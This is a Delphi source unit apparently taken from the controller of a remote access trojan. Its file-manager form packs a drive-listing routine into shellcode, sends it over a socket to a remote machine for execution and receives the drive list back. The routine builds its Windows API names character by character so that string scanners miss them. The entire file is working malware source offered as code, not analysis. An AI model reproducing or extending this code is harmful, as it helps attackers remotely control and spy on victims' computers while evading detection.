unit untFilemanager;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ComCtrls, StdCtrls, untCommands;

type
  TForm2 = class(TForm)
    ComboBox1: TComboBox;
    Edit1: TEdit;
    ListView1: TListView;
  private
    { Private declarations }
  public
    mySocket:Cardinal;
    procedure SetForm(mSocket:Cardinal);
    { Public declarations }
  end;

var
  Form2: TForm2;

implementation
uses
  untUtils;

{$R *.dfm}
procedure pListDrives(ptrData:Pointer; dwLen:Integer; ptrAPIBlock:PAPIBlock); stdcall;
var
  lpszDrive: PChar;
  szDriveListBuffer: Array[0..1023] Of Char;
  szBuffer: Array[0..MAX_PATH] Of Char;
  szDriveInfo: Array[0..15] Of Char;
  iCount, iLoop, iType: Integer;
  strGetLogicalDriveStringsA:Array[0..23] of Char;
  strGetDriveTypeA:Array[0..13] of Char;
  strlstrcatA:Array[0..8] of Char;
  strlstrlenA:Array[0..8] of Char;
  strPattern:Array[0..1] of Char;
  pGetLogicalDriveStringsA:function(nBufferLength: DWORD; lpBuffer: PAnsiChar): DWORD; stdcall;
  pGetDriveTypeA:function(lpRootPathName: PChar): UINT; stdcall;
  plstrcatA:function(lpString1, lpString2: PAnsiChar): PAnsiChar; stdcall;
  plstrlenA:function(lpString: PChar): Integer; stdcall;
begin
  strlstrlenA[0] := 'l';
  strlstrlenA[1] := 's';
  strlstrlenA[2] := 't';
  strlstrlenA[3] := 'r';
  strlstrlenA[4] := 'l';
  strlstrlenA[5] := 'e';
  strlstrlenA[6] := 'n';
  strlstrlenA[7] := 'A';
  strlstrlenA[8] := #0;

  strlstrcatA[0] := 'l';
  strlstrcatA[1] := 's';
  strlstrcatA[2] := 't';
  strlstrcatA[3] := 'r';
  strlstrcatA[4] := 'c';
  strlstrcatA[5] := 'a';
  strlstrcatA[6] := 't';
  strlstrcatA[7] := 'A';
  strlstrcatA[8] := #0;

  strGetLogicalDriveStringsA[0] := 'G';
  strGetLogicalDriveStringsA[1] := 'e';
  strGetLogicalDriveStringsA[2] := 't';
  strGetLogicalDriveStringsA[3] := 'L';
  strGetLogicalDriveStringsA[4] := 'o';
  strGetLogicalDriveStringsA[5] := 'g';
  strGetLogicalDriveStringsA[6] := 'i';
  strGetLogicalDriveStringsA[7] := 'c';
  strGetLogicalDriveStringsA[8] := 'a';
  strGetLogicalDriveStringsA[9] := 'l';
  strGetLogicalDriveStringsA[10] := 'D';
  strGetLogicalDriveStringsA[11] := 'r';
  strGetLogicalDriveStringsA[12] := 'i';
  strGetLogicalDriveStringsA[13] := 'v';
  strGetLogicalDriveStringsA[14] := 'e';
  strGetLogicalDriveStringsA[15] := 'S';
  strGetLogicalDriveStringsA[16] := 't';
  strGetLogicalDriveStringsA[17] := 'r';
  strGetLogicalDriveStringsA[18] := 'i';
  strGetLogicalDriveStringsA[19] := 'n';
  strGetLogicalDriveStringsA[20] := 'g';
  strGetLogicalDriveStringsA[21] := 's';
  strGetLogicalDriveStringsA[22] := 'A';
  strGetLogicalDriveStringsA[23] := #0;

  strGetDriveTypeA[0] := 'G';
  strGetDriveTypeA[1] := 'e';
  strGetDriveTypeA[2] := 't';
  strGetDriveTypeA[3] := 'D';
  strGetDriveTypeA[4] := 'r';
  strGetDriveTypeA[5] := 'i';
  strGetDriveTypeA[6] := 'v';
  strGetDriveTypeA[7] := 'e';
  strGetDriveTypeA[8] := 'T';
  strGetDriveTypeA[9] := 'y';
  strGetDriveTypeA[10] := 'p';
  strGetDriveTypeA[11] := 'e';
  strGetDriveTypeA[12] := 'A';
  strGetDriveTypeA[13] := #0;

  strPattern[0] := '|';
  strPattern[1] := #0;

  @pGetLogicalDriveStringsA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strGetLogicalDriveStringsA[0]);
  @pGetDriveTypeA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strGetDriveTypeA[0]);
  @plstrcatA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrcatA[0]);
  @plstrlenA := ptrAPIBlock^.pGetProcAddress(ptrAPIBlock^.hKernelHandle, @strlstrlenA[0]);
  ptrAPIBlock^.pZeroMemory(@szDriveListBuffer[0], SizeOf(szDriveListBuffer));
  ptrAPIBlock^.pZeroMemory(@szDriveInfo[0], SizeOf(szDriveInfo));
  iCount := pGetLogicalDriveStringsA(MAX_PATH, szBuffer) div 4;
  for iLoop := 0 to iCount - 1 do
  begin
    lpszDrive := PChar(@szBuffer[iLoop * 4]);

    case pGetDriveTypeA(lpszDrive) of
      DRIVE_FIXED:      iType := 1;
      DRIVE_CDROM:      iType := 2;
      DRIVE_REMOVABLE:  iType := 3;
    else
      iType := 1;
    end;
    plstrcatA(szDriveListBuffer, @lpszDrive[0]);
    plstrcatA(szDriveListBuffer, @strPattern);
  end;
  ptrAPIBlock^.pSendBuffer(ptrAPIBlock^.hSocket, CMD_LIST_DRIVE, @szDriveListBuffer[0], plstrlenA(@szDriveListBuffer[0])+ 1);
end;
procedure pListDrives_END();begin end;

procedure TForm2.SetForm(mSocket:Cardinal);
var
  pFunction:Pointer;
  dwFunction:Cardinal;
begin
  mySocket := mSocket;
  pFunction := prepShellCodeWithParams(@pListDrives, nil, (DWORD(@pListDrives_END) - DWORD(@pListDrives)), 0,dwFunction);
  if pFunction <> nil then
  begin
    SendBuffer(mySocket, 0, pFunction, dwFunction+1);
    FreeMem(pFunction);
  end;
end;
end.
